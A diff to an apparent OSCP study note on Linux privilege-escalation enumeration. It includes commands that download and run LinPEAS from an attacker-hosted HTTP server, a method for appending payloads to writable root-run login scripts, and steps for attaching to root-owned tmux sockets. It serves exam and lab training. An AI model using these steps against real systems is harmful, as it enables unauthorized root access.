@@ -4,25 +4,50 @@
 
 *Identify the user, host, kernel, and the local privilege paths available from the shell.*
 
+> [!tip] 💡 Follow-along mode
+> You are here after a usable Linux shell arrives. Run the identity and manual checks first, optionally add LinPEAS, then choose exactly one privilege path under **What did you get?**. If the shell is still awkward, return to [[Linux - Shell Stabilise]] before transferring tools.
+
 ## Run this
 
-> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
+> **Why:** Manual checks give you the facts behind an automated finding. LinPEAS is a second pass, not a replacement for reading `sudo -l`, SUID, cron, services, credentials, and listening ports yourself.
 
-Run the identity checks first, then transfer and run LinPEAS, a local-enumeration script that highlights common privilege-escalation paths. Use this after a shell is stable; the results tell you which focused page to open next.
+Run the identity checks first:
 
 ```bash
 whoami
 id
 hostname
 uname -a
-curl http://$LocalIP:$WebPort/linpeas.sh -o /tmp/linpeas.sh
+cat /etc/os-release 2>/dev/null
+sudo -n -l 2>/dev/null || sudo -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+ps auxww
+ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
+find / -type f -writable 2>/dev/null | head -n 200
+```
+
+Optional LinPEAS pass. In a second Kali terminal, prepare the transfer server. Replace `LINPEAS_PATH_FROM_OUTPUT` with the path printed by `find`:
+
+```bash
+boxset TransferPort 8000
+find /usr/share -type f -name 'linpeas.sh' -print -quit
+cp "LINPEAS_PATH_FROM_OUTPUT" "$BoxDir/www/linpeas.sh"
+python3 -m http.server "$TransferPort" --directory "$BoxDir/www"
+```
+
+Back in the target shell, use the first downloader that exists:
+
+```bash
+command -v curl || command -v wget
+curl -fsSL "http://$LocalIP:$TransferPort/linpeas.sh" -o /tmp/linpeas.sh || wget "http://$LocalIP:$TransferPort/linpeas.sh" -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh
+/tmp/linpeas.sh 2>&1 | tee /tmp/linpeas.out
 ```
 
 ## Example output
 
- > *Example shape only: the LinPEAS transfer command is not yet verified against a real box.*
+ > *Example shape only: the exact findings depend on the target and current user.*
 ```
 uid=1000(username) gid=1000(username) groups=1000(username)
 Linux host 5.x x86_64
@@ -41,15 +66,12 @@ Linux host 5.x x86_64
 
 ## Notes
 
-Start the Kali helper web server with `transfer` or `www` before downloading, and use the port it prints. `$WebPort` is the target web port, not automatically the Kali server port.
+`$WebPort` is the target web port. `$TransferPort` is the Kali HTTP-server port. Keeping them separate prevents a common mistake where the target tries to download LinPEAS from its own web service.
 
 ## Gotcha
 
 > [!warning] 💡
-> The exact LinPEAS transfer command varies by shell and target tools. Confirm the available downloader before using it.
-
-> [!warning]
-> Command not yet verified against a real box. Confirm the exact `wget` transfer and LinPEAS execution syntax before relying on it in an exam.
+> Stop the temporary Kali HTTP server after the transfer. If neither `curl` nor `wget` exists, use the file-transfer alternatives in [[File Transfers]] or run the manual checks only.
 
 ## Writable scheduled script discovery
 
@@ -128,6 +150,39 @@ If the VNC RFB service is bound to `127.0.0.1`, it is invisible to the external 
 
 - [ ] A root-owned loopback VNC service is found → **Set `$RemotePort` to the RFB port and go to Step 20 · [[Linux - Port Forwarding]]**
 
+## Login-triggered root scripts
+
+If a reachable user can write to a script under `/etc/update-motd.d`, `/etc/profile.d`, or another login hook, identify who runs it and what event triggers it. This branch is especially important after a sudo-to-user pivot because the new user's group memberships may grant write access that the original foothold did not have.
+
+```bash
+find /etc/update-motd.d /etc/profile.d -maxdepth 1 -type f -ls 2>/dev/null
+stat -c '%U:%G %A %n' /etc/update-motd.d/* /etc/profile.d/* 2>/dev/null
+grep -RniE 'ssh|motd|profile|source|exec' /etc/ssh /etc/update-motd.d /etc/profile.d 2>/dev/null
+```
+
+- [ ] A root-run login script is writable → **Back it up, append only a controlled lab payload, trigger a fresh login, verify the side effect, restore it, then go to Step 15 · [[Linux - SUID Check]] if a SUID helper was created**
+- [ ] The script is not writable → **Continue with sudo, SUID, cron, service, capability, and credential branches**
+
+## Unix socket and tmux session discovery
+
+When a local Unix-domain socket is readable by the current user, identify the owning process and test whether it belongs to a terminal multiplexer. A root-owned tmux socket can expose an existing privileged session without requiring a new exploit.
+
+> **Why:** External scans cannot see local IPC endpoints. Socket ownership, permissions, and a successful tmux attach are the evidence chain for this branch.
+```bash
+find / -type s -ls 2>/dev/null
+ls -la $SocketDir
+tmux -S $TmuxSocket ls
+tmux -S $TmuxSocket attach-session -t 0
+id
+```
+
+> [!warning] 💡
+> Attach only after confirming the socket path and permissions. Preserve the original socket evidence and avoid sending commands until the session identity is visible.
+
+## Additional routing
+
+- [ ] A root-owned, readable tmux socket is found -> **Attach to the existing session, confirm identity, then collect the root proof**
+
 ## Seen in
 - *(no write-up yet)*
 - [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- identity checks led to sudo enumeration
@@ -139,6 +194,9 @@ If the VNC RFB service is bound to `127.0.0.1`, it is invisible to the external 
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- FreeBSD identity checks, netstat, and process inspection exposed root's loopback VNC service
 - [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- identity, architecture, history, and SUID checks routed to a custom helper source review
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- architecture checks, systemd timer enumeration, and backup-script review exposed the archive race
+- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- local socket enumeration exposed a root-owned tmux session after the SSH foothold
+- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- home-script review exposed the exact sudo-enabled journalctl invocation
+- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- identity and sudo checks exposed Luvit; MOTD permissions revealed a login-triggered root execution path
 
 ## Related stages
 
